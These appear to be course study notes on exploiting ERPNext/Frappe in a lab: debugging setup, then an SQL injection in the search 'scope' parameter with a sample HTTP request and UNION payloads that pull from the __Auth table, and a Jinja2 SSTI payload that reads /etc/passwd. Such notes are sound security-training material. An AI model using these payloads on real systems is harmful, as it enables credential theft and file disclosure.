# ERP Next

## Configure SMTP Server

Start an smtp server:
```bash
sudo python -m smtpd -n -c DebuggingServer 0.0.0.0:25
```

Tell Frappe to use our SMTP server by configuring `~/frappe-bench/sites/site1.local/site_config.json` and setting:

```json
{
    "mail_server": "192.168.119.137",
    "use_ssl": 0,
    "mail_port": 25,
    "auto_email_id": "sender@domain.com"
}
```

## Remote Debugging of Frappe

Uses `bench` to start multiple processes, configured in `/home/frappe/frappe-bench/Procfile`.  

The `bench start` command will run our application from `/home/frappe/frappe-bench/apps/frappe/frappe/app.py`.  We will inject some extra code to open a debugging port (TCP/5678) for the Visual Studio Code and wait for the remote debugger to attach:

```python
import ptvsd
ptvsd.enable_attach(redirect_output=True)
ptvsd.wait_for_attach()
```

Transfer the entire app code with rsync to our Kali machine so we can debug it.

```bash
rsync -azP frappe@192.168.121.123:/home/frappe/frappe-bench ./
```

Run our frappe python app from the `sites` folder using the `bench_helper.py` script:

```bash
../env/bin/python ../apps/frappe/frappe/utils/bench_helper.py frappe serve --port 8000 --noreload --nothreading
```

In VS Code, go to the debugger and create a `launch.json` file to start a remote debugging session.  Make sure to set the `remoteRoot` to the path where the code is running from on the server.

## MariaDB Query Logging

OSS fork of MySQL; similar config at `/etc/mysql/my.cnf`.

Configure the `general_log_file` and `general_log` settings to enable query logs, then `tail` this file.

## SQL Injection

SQL injection available in the search `scope` param (and others).

```
POST / HTTP/1.1
Host: 192.168.137.123:8000
Content-Length: 142
Accept: application/json, text/javascript, */*; q=0.01
X-Frappe-CSRF-Token: None
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.137.123:8000
Referer: http://192.168.137.123:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: system_user=yes; user_image=; sid=Guest; full_name=Guest; user_id=Guest
Connection: close

cmd=frappe.utils.global_search.web_search&text=hello&scope=INJECT
```


See list of provided injections to be injected provided by OffSec.

Beware of COLLATION errors when using `UNION`.  You may to figure out the collection to use and then explicitly set the collation as follows:

```sql
" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#
```
```sql
" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#
```

Use the password reset function rather than trying to brute-force the password hashes available.

## Server-side Template Injection

Jinja templates used.  Ultimately, this still translates to Python under the hood!  

Test for SSTI using a simple expression like `{{1+2}}` and see if it is evaluated.

Example injection for Python:
* Given a string
* Get the `__class__` class metadata for it
* Get the "method resolution order" or `__mro__`, returns a tuple of classes, in the order in which an attribute or methods in overriden classes should be searched for in either the current class or parent classes.  
* The `__subclassess__` method returns all references to classes that have overriden a class.
* #40 in this case is the `file` type, so we can create a instance of it and call `read` to read a file from disk.

```python jinja
{{ ''.__class__.__mro__[2].__subclassess__()[40]('/etc/passwd').read() }}
```

Note that the Python version will affect your SSTI payloads:
    * In Python3, all classes override from `object` at a minimum, even if this isn't explicitly defined.
    * In Python3, `string` inherits from `object`, whereas in Python2, `string` inherits from `basestring` which in turn inherits from `object`.

Note that you can use `copy(temp1)` in Chrome Dev Tools to copy something to the clipboard!

## References

[Jinja2 SSTI filter bypasses](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)

[Jinja2 template injection filter bypasses](https://0day.work/jinja2-template-injection-filter-bypasses/)

[Cheatsheet - Flask & Jinja2 SSTI](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)

[Tplmap](https://github.com/epinna/tplmap)

[SecList - Discovery/Web_Content/burp-parameter-names](https://raw.githubusercontent.com/albinowax/SecLists/9309803f3f7d5c1e0b2f26721c1ea7ef36eeb1c8/Discovery/Web_Content/burp-parameter-names)